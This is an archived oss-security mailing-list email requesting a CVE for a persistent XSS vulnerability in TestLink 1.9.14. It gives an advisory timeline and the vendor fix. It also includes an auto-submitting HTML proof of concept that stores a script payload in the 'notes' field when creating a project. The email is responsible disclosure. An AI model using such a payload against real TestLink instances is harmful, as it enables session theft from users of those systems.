X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2681" "Sunday" "8" "November" "2015" "20:25:46" "+0530" "Aravind" "altoarun@gmail.com" "<CALySL4QPLKPQzzLRRkr5U-nSEmE4DOUfsqSKQtdrkFGkikD48A@mail.gmail.com>" "98" "[oss-security] CVE Request: TestLink 1.9.14 Persistent XSS Vulnerability" nil nil nil "11" "2015110814:55:46" "[oss-security] CVE Request: TestLink 1.9.14 Persistent XSS Vulnerability" (number mark "U       altoarun@gma Nov  8   98/2681  " thread-indent "\"[oss-security] CVE Request: TestLink 1.9.14 Persistent XSS Vulnerability\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 11505 invoked by uid 550); 8 Nov 2015 15:25:46 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 26158 invoked from network); 8 Nov 2015 14:56:17 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20120113;
        h=mime-version:from:date:message-id:subject:to:content-type;
        bh=fdg7Ln7nT/16Z9QHxnYlprThaP4aFVJ5nygBOSharfM=;
        b=bm9ALDCjqYDdIYEt7siG+DOGYa1azjM0TbYwNgVsSCrWZ5Ujl2aTSm96MdTCIrdbEJ
         cR7fkOCbu55aHyOIYHYNcHYE49Ajryw3S/ltHUSVN8t71OvwiSpM+TDXqUnXQG//cuaQ
         +L8609YBQW4vJdamSvEI98qqz5qnAuFxDe3S6+Sj+BN6/6eak1STVu3bQ8690kbvl+6s
         dqSzUMHIKIGx6McsnorKiLe87lzw15kHuQQK+DLjvuGqn4e3DLsqySnZfwQBvCuVZpr4
         TWGpKgIOejqh4FD2g48FcSJtCuNlJKWu006dtSgUkQKq5RUzgXM7o2MrP1w43nQneTQM
         D14A==
X-Received: by 10.194.179.35 with SMTP id dd3mr3092545wjc.125.1446994565443;
 Sun, 08 Nov 2015 06:56:05 -0800 (PST)
MIME-Version: 1.0
From: Aravind <altoarun@gmail.com>
Date: Sun, 8 Nov 2015 20:25:46 +0530
Message-ID: <CALySL4QPLKPQzzLRRkr5U-nSEmE4DOUfsqSKQtdrkFGkikD48A@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: text/plain; charset=UTF-8
Subject: [oss-security] CVE Request: TestLink 1.9.14 Persistent XSS Vulnerability

Can I have a CVE assigned to the following ?


Information
=================================
Name: Persistent XSS Vulnerability in TestLink 1.9.14
Affected Software: TestLink
Affected Versions: 1.9.14 and possibly below
Vendor Homepage: http://testlink.org/
Severity: High
Status: Fixed


Vulnerability Type:
=================================
Persistent XSS


CVE Reference:
=================================
Not assigned


Technical Details:
=================================
Persistent XSS entry point exist in TestLink 1.9.14 allowing arbitrary
client side browser
code execution on victims who visit persistently stored XSS payloads.
The vulnerability has been
discovered in the POST request to create a new Test Project. By
exploiting the vulnerability,
the attacker will get access to the logged in users session cookie. No
Filtering exist on the
vulnerable parameter.


Vulnerable Parameter:
=================================
notes


Exploit Code
=================================

<html lang="en">
<head>
<title>Exploit Persistent XSS TestLink 1.9.14</title>
</head>
<body>
<form action="http://localhost/testlink_1_9_14/lib/project/projectEdit.php"
id="formid" method="post">
<input type="hidden" name="CSRFName" value="" />
<input type="hidden" name="CSRFToken" value="" />
<input type="hidden" name="copy_from_tproject_id" value="0" />
<input type="hidden" name="tprojectName" value="c1" />
<input type="hidden" name="tcasePrefix" value="c2" />
<input type="hidden" name="notes" value="<script>alert(222)</script>" />
<input type="hidden" name="optPriority" value="on" />
<input type="hidden" name="optAutomation" value="on" />
<input type="hidden" name="active" value="on" />
<input type="hidden" name="is_public" value="on" />
<input type="hidden" name="doAction" value="doCreate" />
<input type="hidden" name="tprojectID" value="0" />
<input type="hidden" name="doActionButton" value="Create" />
</form>
<script>
document.getElementById('formid').submit();
</script>
</body>
</html>


Exploitation Technique:
===================================
Remote


Severity Level:
===================================
High


Advisory Timeline
===================================
Sat, 7 Nov 2015 13:14:33 +0530 - First Contact
Sat, 7 Nov 2015 08:52:14 +0100 - Vendor Response
Sat, 7 Nov 2015 13:00:54 +0100 - Vendor Fixed
Sun, 8 Nov 2015 19:03:00 +0530 - Public Disclosure


Solution
====================================
This vulnerability is fixed in TestLink 1.9.15 (Tauriel)
Fix: https://github.com/TestLinkOpenSourceTRMS/testlink-code/commit/1cb1f78f1a50f6e6819bcbadeae345eb3213c487

Credits & Authors
====================================
Aravind C Ajayan, Boney S Kalarickal
